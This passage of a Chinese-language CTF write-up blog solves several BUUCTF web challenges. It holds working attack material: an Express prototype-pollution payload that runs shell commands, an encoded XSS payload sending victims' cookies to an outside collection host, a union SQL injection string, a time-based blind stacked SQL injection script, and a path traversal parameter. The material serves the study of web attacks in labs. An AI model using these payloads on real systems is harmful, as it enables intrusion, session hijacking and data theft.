class="comment">//login,将我们输入的账号密码，和session里的user,passwd比较，相同则成功登入</span></span><br></pre></td></tr></table></figure>


<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//action,如果session中的user不等于ADMIN，报错，否则对参数data做clone()操作</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//info ,这里有参数outputFunctionName，但是res.outputFunctionName=undefined;结合/action路由的clone(),也就是可以通过污染outputFunctionName进行SSTI,原理知识点里已经讲了（merge()污染）</span></span><br></pre></td></tr></table></figure>
<p>结合题目名字Ez_Express。这是一个express框架下存在的一个rce漏洞利用点。具体见这篇文章<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/" target="_blank">Express+lodash+ejs: 从原型链污染到RCE</a></p>
<p>利用链文章里有写</p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要将content-type改为 application/json</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;lua&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="attr">&quot;Submit&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>到/info路径，下载得到flag文件</p>
<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>知识点：</p>
<ol>
<li>XSS 窃取cookie</li>
<li>CSP安全策略</li>
<li>常规联合注入</li>
</ol>
<p>拿到题目，随便注册下，有两个页面投稿和审核，通过扫目录可以发现还有一个admin.php路径</p>
<p>思路是通过投稿恶意XSS，然后点击审核，管理员就会来到我们的页面，审核我们的投稿<br>这样的话我们可以构造恶意代码，让管理员进去，从而窃取管理员的cookie，进入后台为所欲为</p>
<p>XSS构造网址题目有给  <a href="http://xss.buuoj.cn/">xss.buuoj.cn</a>  </p>
<p>平台会自动帮我们生成xss代码，自己可以研究一下那一摞代码都是干嘛的，很有意思哟<br>OK，我们回到投稿页面，来一个最简单的脚本实验一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>提示我们上传成功，查看下上传文件源代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-security-policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert（1）<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>通过Fuzz ,我们发现英文小括号被换成中文的了，“=”被替换成了中文“等于号” 等等，说明后端有保护机制，不过虽然头大，我们却可以用<strong>markup编码的方式绕过</strong>（就是我们喜闻乐见的&amp;#编码） HTML Markup: <a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">https://www.w3.org/MarkUp/html-spec/html-spec_13.html</a></p>
<p>再看之前的源代码<br><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu31.png"><br>它有个CSP内容安全策略的存在，<a href="https://www.cnblogs.com/heyuqing/p/6215761.html" target="_blank">CSP内容安全策略详解</a></p>
<blockquote>
<p><strong>CSP全称Content Security Policy ,可以直接翻译为内容安全策略,说白了,就是为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规责指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源）。通过CSP协定，让WEB处于一个安全的运行环境中。</strong></p>
<p><strong>通过csp我们可以制定一系列的策略,从而只允许我们页面向我们允许的域名发起跨域请求,而不符合我们策略的恶意攻击则被挡在门外</strong></p>
</blockquote>
<p>它开启了’unsafe-eval’，所以我们可以用eval来执行我们的代码</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu32.jpg"></p>
<p>所以，我们的payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">in_str =<span class="string">&quot;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=qIiHBg&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();&quot;</span></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> in_str:</span><br><span class="line">    output += <span class="string">&quot;&amp;#&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot;</span> + output + <span class="string">&quot;&amp;#34&amp;#41&lt;/script&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;svg&gt;</span><span class="section">&lt;script&gt;</span><span class="attribute">eval</span>&amp;#<span class="number">40</span>&amp;#<span class="number">34</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">104</span>&amp;#<span class="number">116</span>&amp;#<span class="number">116</span>&amp;#<span class="number">112</span>&amp;#<span class="number">58</span>&amp;#<span class="number">47</span>&amp;#<span class="number">47</span>&amp;#<span class="number">120</span>&amp;#<span class="number">115</span>&amp;#<span class="number">115</span>&amp;#<span class="number">46</span>&amp;#<span class="number">98</span>&amp;#<span class="number">117</span>&amp;#<span class="number">117</span>&amp;#<span class="number">111</span>&amp;#<span class="number">106</span>&amp;#<span class="number">46</span>&amp;#<span class="number">99</span>&amp;#<span class="number">110</span>&amp;#<span class="number">47</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">101</span>&amp;#<span class="number">120</span>&amp;#<span class="number">46</span>&amp;#<span class="number">112</span>&amp;#<span class="number">104</span>&amp;#<span class="number">112</span>&amp;#<span class="number">63</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">61</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">105</span>&amp;#<span class="number">38</span>&amp;#<span class="number">105</span>&amp;#<span class="number">100</span>&amp;#<span class="number">61</span>&amp;#<span class="number">113</span>&amp;#<span class="number">73</span>&amp;#<span class="number">105</span>&amp;#<span class="number">72</span>&amp;#<span class="number">66</span>&amp;#<span class="number">103</span>&amp;#<span class="number">38</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">117</span>&amp;#<span class="number">109</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">116</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">43</span>&amp;#<span class="number">39</span>&amp;#<span class="number">38</span>&amp;#<span class="number">116</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">116</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">43</span>&amp;#<span class="number">39</span>&amp;#<span class="number">38</span>&amp;#<span class="number">99</span>&amp;#<span class="number">111</span>&amp;#<span class="number">111</span>&amp;#<span class="number">107</span>&amp;#<span class="number">105</span>&amp;#<span class="number">101</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">117</span>&amp;#<span class="number">109</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">116</span>&amp;#<span class="number">46</span>&amp;#<span class="number">99</span>&amp;#<span class="number">111</span>&amp;#<span class="number">111</span>&amp;#<span class="number">107</span>&amp;#<span class="number">105</span>&amp;#<span class="number">101</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">43</span>&amp;#<span class="number">39</span>&amp;#<span class="number">38</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">40</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">32</span>&amp;#<span class="number">38</span>&amp;#<span class="number">38</span>&amp;#<span class="number">32</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">41</span>&amp;#<span class="number">63</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">58</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">59</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">59</span>&amp;#<span class="number">34</span>&amp;#<span class="number">41</span>&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>至于为什么要加<svg>,原因如下</svg></p>
<p> <a href="http://bobao.360.cn/learning/detail/292.html" target="_blank">深入理解浏览器解析机制和XSS向量编码</a></p>
<p><a href="https://www.hackersb.cn/hacker/85.html#%E7%96%91%E9%97%" target="_blank">SVG XSS的一个黑魔法</a></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu33.jpg"></p>
<p>我们替换的&amp;#作为字符引用需要用外部元素进行解析，而<svg>恰好就为外部元素</svg></p>
<p>接下去将题目，在我们将payload投稿之后，到审查页面，验证码需要md5爆破，老套路了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">100000000</span>):</span><br><span class="line">    md5_hack = hashlib.md5(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> md5_hack[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;9e0677&quot;</span>:</span><br><span class="line">        print(x)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<p>注意下这里的文件路径为<a href="http://web.node3.buuoj.cn/post/xxxxxxxx">http://web.node3.buuoj.cn/post/xxxxxxxx</a></p>
<p>回到 <a href="http://xss.buuoj.cn/">xss.buuoj.cn</a>  ，得到cookie ,修改cookie 到admin.php页面，进行常规联合注入即可得到flag</p>
<blockquote>
<p>-1 union select 1,flagg,3 from flag#</p>
</blockquote>
<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>知识点：</p>
<ol>
<li><strong>预处理+时间注入 +hex转码</strong></li>
</ol>
<p>题目给了一个登录框，如果点击注册功能的话会弹窗注册功能未开放；如果随便输用户名点登录的话没有反应，抓包看看：</p>
<p><code>username</code>和<code>password</code>是用json格式发送的，并且会返回一段信息。先测试有没有注入点：我们尝试在username 后使用 “，发现报错了</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu34.jpg"></p>
<p>使用#闭合，发现返回200</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu35.jpg"></p>
<p>经过简单的手动fuzz之后发现没有办法进行联合查询（因为没有回显）和有Boolean回显的盲注，我猜可能是服务器全给WAF掉了，一般这种情况下可以考虑以下堆叠注入，所以我修改<code>username</code>为<code>123&#39;;</code>，结果发现回显正常：</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu36.jpg"></p>
<p>这样一来，可以推测拼接到服务器端的SQL语句就是：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">select * from &#123;table_name&#125; where username=&#x27;123&#x27;;&#x27; and password=&#x27;123&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>因为;号表示一个SQL语句的结束，;号后面的一个’号被认为是下一个SQL语句的开始，所以没有产生报错，也就是说，这个题目是存在堆叠注入的（;号被解析了）</strong></p>
<p><strong>可以使用 时间盲注 + 堆叠注入+hex转码 进行注入，（在MySQL中0x开头的十六进制数会被转换成字符串，使用hex转码是为了绕过WAF）</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu37.jpg"></p>
<p>大佬写的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#author: c1e4r</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://e4b6b45e-5ca4-45ca-93c5-a16e3cf2fe5c.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            print(datas)</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


<p>得到 </p>
<blockquote>
<p>glzjin_wants_a_girl_friend.zip</p>
</blockquote>
<p>下载得到源码，<del>本来以为注入出来就是flag</del></p>
<p>审计，代码很简单</p>
<p>总的流程为，通过UserController类 中 的 actionIndex 方法，把$_REQUEST这个数组赋值给了$listData，然后传入了loadView 方法</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu38.jpg"></p>
<p>而loadView 方法 恰好为 BaseController类中loadView方法的第二参数，这个第二参数进行了变量覆盖，而第一个参数进行一下路径的拼接得到一个php文件，然后直接包含该文件，因为传入<code>loadView</code>方法的第一个参数是<code>userIndex</code>，所以我们跟进<code>userIndex.php</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu38-2.jpg"></p>
<p>#userIndex :我们可以通过变量覆盖设置$img_file的值, 而该代码会将该变量所对应的文件内容进行b64编码处理</p>
<p>所以我们传参 img_file=../../../flag.php</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu39.jpg"></p>
